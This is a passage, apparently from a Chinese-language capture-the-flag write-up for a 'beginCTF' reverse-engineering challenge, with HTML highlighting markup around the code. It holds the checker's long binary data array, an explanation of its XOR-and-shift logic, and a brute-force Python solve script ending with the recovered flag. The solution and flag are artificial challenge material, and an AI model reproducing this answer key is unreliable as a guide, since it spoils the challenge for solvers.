punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着分析后面的主要逻辑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">使用了一堆列表推导式完成循环结构，对应逻辑如下：<span class="token number">1.</span>遍历<span class="token builtin">input</span>，获取index和context<span class="token number">2.</span>遍历<span class="token string">b"beginCTF"</span>为x，进行 <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0x6</span> <span class="token operator">^</span> <span class="token number">0x7</span> <span class="token operator">+</span> <span class="token number">0xFFF</span> <span class="token operator">-</span> index<span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">)</span> 运算，然后求和（出题人对着出题源码搓的exp，数值表达上略有出入）<span class="token number">3.</span>转为<span class="token builtin">bin</span>，去除0b两个字符，保留原始的二进制数据，遍历出来转为<span class="token builtin">int</span>存为<span class="token builtin">list</span><span class="token number">4.</span>一个字符对应一个<span class="token builtin">list</span>，组成<span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span>，与data进行比较，全相等（<span class="token builtin">all</span>）则输出<span class="token boolean">True</span>然后直接手搓出正向解密脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> string <span class="token keyword">import</span> printabledata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>ndata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>y <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ndata<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> printable<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">6</span><span class="token operator">^</span><span class="token number">4102</span><span class="token operator">-</span>i<span class="token operator">^</span>k <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token string">b'beginCTF'</span><span class="token punctuation">)</span> <span class="token operator">==</span> y<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># begin&#123;Y@u_aRe_g00d_aT_play1ng_witH_sNake</span><span aria-hidden="true" 